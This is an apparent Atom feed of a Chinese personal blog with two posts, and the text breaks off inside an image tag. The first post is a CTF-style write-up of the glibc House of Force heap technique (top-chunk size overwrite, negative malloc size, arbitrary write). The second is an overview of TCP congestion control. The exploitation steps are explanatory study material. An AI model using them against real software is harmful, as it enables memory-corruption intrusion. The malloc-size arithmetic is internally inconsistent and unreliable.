<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>mrh929&#39;s home</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://mrh1s.top/"/>
  <updated>2020-06-14T10:08:43.135Z</updated>
  <id>https://mrh1s.top/</id>
  
  <author>
    <name>mrh929</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>glibc house_of_* 漏洞集锦</title>
    <link href="https://mrh1s.top/posts/7532c0cc/"/>
    <id>https://mrh1s.top/posts/7532c0cc/</id>
    <published>2020-06-14T09:28:23.000Z</published>
    <updated>2020-06-14T10:08:43.135Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="House-of-Einherjar">House of Einherjar</h3><p>也就是利用 off_by_one 的原理来填充 next_chunk 的 prev_size ，再进行 unlink 操作，配合 fake_chunk 的构造，实现任意地址写。（详情见之前的文章）</p><h3 id="House-of-Force">House of Force</h3><h4 id="介绍">介绍</h4><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/" target="_blank" rel="noopener">参考文章</a></p><p>House Of Force 是一种堆利用方法，但是并不是说 House Of Force 必须得基于堆漏洞来进行利用。如果一个堆 (heap based) 漏洞想要通过 House of Force 方法进行利用，需要以下条件：</p><ol><li>能够以 ==溢出== 等方式控制到 ==top chunk== 的 ==size== 域</li><li>能够自由地控制堆分配尺寸的大小</li></ol><p>简而言之，如果我现在能够进行堆溢出，修改 ==top_chunk== 的 ==size==， 并且拥有两次能够任意控制大小的 ==malloc== 的机会，通过构造payload， 可以实现任意地址写。</p><h4 id="步骤">步骤</h4><ol><li>填充 top_chunk_size</li></ol><p>我现在有一个堆块，是我自己创建的（0x603020），大小为0x30。紧跟其后的是 ==top_chunk==，大小为0x20fa0，现在我可以通过堆溢出的方式将 0x603068 修改为 ==p64(-1)==</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/06/14/2aiz3txGNIE4hRf.png" alt="Snipaste_2020-06-14_17-38-27.png"></p><p>修改完成：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/06/14/1MmRZVKq6Sr8tD9.png" alt="a.png"></p><p>这样，glibc 在 top_chunk 切割并分配新的区块的时候，就会认为自己有一个非常大的 top_chunk，就能够实现任意大小区块的分配。</p><ol start="2"><li>构造 malloc_size</li></ol><p>如果这个时候分配一个 p64(-0x60) 的区块，由于 unsigned_int 的关系，-0x60被转化成一个很大的正数，top_chunk 被切割（相当于把 2^64 - 0x60的内存空间全部当作堆块分配了出来 =-=），于是 top_chunk 就回归到了 0x60的大小，同时位置也跑到了刚刚的 offset = -0x60 的位置上去。</p><p>这样我们就可以修改到 -0x50 开始的一系列数据</p><p>但是 malloc 负数空间的处理方式有所不同，应该如何构造这个 malloc_size 呢？</p><blockquote><p>一方面，我们需要绕过 REQUEST_OUT_OF_RANGE(req) 这个检测，即我们传给 malloc 的值在负数范围内，不得大于 -2 * MINSIZE，这个一般情况下都是可以满足的。</p><p>另一方面，在满足对应的约束后，我们需要使得 <code>request2size</code>正好转换为对应的大小，也就是说，我们需要使得 ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK 恰好为 - 4112。首先，很显然，-4112 是 chunk 对齐的，那么我们只需要将其分别减去 SIZE_SZ，MALLOC_ALIGN_MASK 就可以得到对应的需要申请的值。其实我们这里只需要减 SIZE_SZ 就可以了，因为多减的 MALLOC_ALIGN_MASK 最后还会被对齐掉。而<strong>如果 -4112 不是 MALLOC_ALIGN 的时候，我们就需要多减一些了。当然，我们最好使得分配之后得到的 chunk 也是对齐的，因为在释放一个 chunk 的时候，会进行对齐检查。</strong></p><p>– ctf-wiki</p></blockquote><p>我们只需要让 ==((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK== 恰好等于 -0x60 就行了。</p><p>==req== 就是我们的 malloc_size</p><p>==SIZE_SZ== 等于 4（32位），8（64位）</p><p>==MALLOC_ALIGN_MASK== 等于 4（32位），7（64位）</p><p>==req== = -0x30 - ==SIZE_SZ== - ==MALLOC_ALIGN_MASK== = -0x60 - 7 - 4 = -0x3B</p><p>malloc(-0x6B) 即可</p><p>可以看到，修改之后，top_chunk的位置从 0x603060 变到了 0x603000。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/06/14/IMh1oBA5UOXdVkx.png" alt="b.png"></p><ol start="3"><li>写数据</li></ol><p>再进行一次 malloc，但是要保证 ==new_chunk_size + 0x10 &lt;= top_chunk_size==，这样，glibc就在我们期望的地方申请了区块，就可以对其进行操作了。</p><h4 id="PS">PS</h4><ol><li><p>这个方法只适用于有堆溢出的题目，并且要有malloc两次任意大小区块的能力</p></li><li><p>根据 <em>randomize_va_space</em> 的不同，该利用方法的使用范围不同</p><p>​该方法极度依赖堆地址，若系统开启堆地址随机化（即<em>randomize_va_space</em>=2），则不能达到任意地址写的目的。但修改后向的堆块数据还是可以做到的（比如本题）。</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="write_up" scheme="https://mrh1s.top/categories/write-up/"/>
    
    
      <category term="pwn_heap" scheme="https://mrh1s.top/tags/pwn-heap/"/>
    
  </entry>
  
  <entry>
    <title>TCP拥塞控制概览</title>
    <link href="https://mrh1s.top/posts/f490955d/"/>
    <id>https://mrh1s.top/posts/f490955d/</id>
    <published>2020-03-30T03:47:11.000Z</published>
    <updated>2020-03-30T04:27:39.629Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="为什么要进行拥塞控制">为什么要进行拥塞控制</h2><p>因为网络中的数据包吞吐量有限，且级数过多，一旦数据包在某一跳被丢包，那么它之前所经过的所有路由器、交换机消耗的资源将变成无用功。</p><p>并且网络中的两个终端设备一般都有多条数据链路相连接而成，当一条链路通畅或拥塞时，需要有一种算法来帮助终端设备更好地利用现有的网络资源来达到资源最大化的效果。</p><h2 id="TCP拥塞控制的参数定义">TCP拥塞控制的参数定义</h2><p>· 控制方式：端到端控制（没有网络辅助）</p><p>· 主体：发送方限制发送</p><p><code>LastByteSent-LastByteAcked &lt; min( CongWin , RcvWindow )</code></p><p>· 在大体上，设备会限制自己发包的速度为：</p><p><code>rate = CongWin / RTT</code> (阻塞窗口除以往返时延)</p><ol><li><code>CongWin</code>(cwnd) 是一个动态函数，用于感知网络拥塞。</li><li><code>ssthresh</code> 是一个阈值，用来划分<strong>TCP慢启动状态</strong>和<strong>拥塞避免状态</strong>，它也是一个动态的参数。</li><li><code>MSS</code> (maximum segment size) 每一个报文段所能承载的最大数据长度，通常这个也是拥塞控制的最小单位。</li></ol><h2 id="TCP拥塞控制的三个阶段">TCP拥塞控制的三个阶段</h2><h3 id="慢启动">慢启动</h3><p>TCP连接初始化时，<code>cwnd</code> 默认为 一个<code>MSS</code>。</p><p>当 <code>cwnd</code> 小于 <code>ssthresh</code> 时，每个RTT它都会<strong>加倍发包</strong>，以一个较快的速度达到 <code>ssthresh</code>。</p><p>当 <code>cwnd</code> 大于等于 <code>ssthresh</code> 时，它将会转移到<strong>拥塞避免</strong>阶段。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/03/30/vGshPuA9crzJdQm.png" alt="1.png"></p><h3 id="拥塞避免">拥塞避免</h3><p>在这个状态中， 每个RTT它只会将发包的速度<strong>线性增加</strong>，即</p><p><code>cwnd = cwnd + MSS *(MSS/cwnd)</code> (when receiving a packet)。</p><p>（MSS/cwnd 为每个MSS包平均消耗的发包时间，这样的定义是为了让这个RTT里面发出的所有包得到回应时，cwnd能刚好增加一个MSS的大小）</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/03/30/gEPnUDNFX5J7V2K.png" alt="2.png"></p><h3 id="快速恢复">快速恢复</h3><p>前面的操作都没有提到快速恢复，这是因为前面两个状态随时都有可能转移到快速恢复上来，只需要满足一个条件： <strong>收到同一个包三次</strong>。</p><p>这就表明了网络已经遭遇了拥塞，以至于同一个包被发送方发送了三次，终端必须改变它的参数来避免网络拥塞的状况，便会转移到快速恢复状态上来。</p><p>同时 <code>ssthresh = cwnd / 2</code> , <code>cwnd = ssthresh + 3</code>。</p><p>在这个状态中，每个RTT内终端都会检测自己是否能接收到数据包以及接收到的数据包的类型：</p><ol><li>依然是重复发包：<code>cwnd = cwnd + MSS</code> 。</li><li>收到了新的数据包：<code>cwnd = ssthresh</code> ，并重置重复收包计数器，转至<strong>拥塞避免</strong>状态。</li><li>超时：不论什么情况下，超时都会导致状态直接转移回<strong>慢启动</strong>状态，并且所有参数重置，和刚刚建立TCP连接时的情况一样。</li></ol><p><img 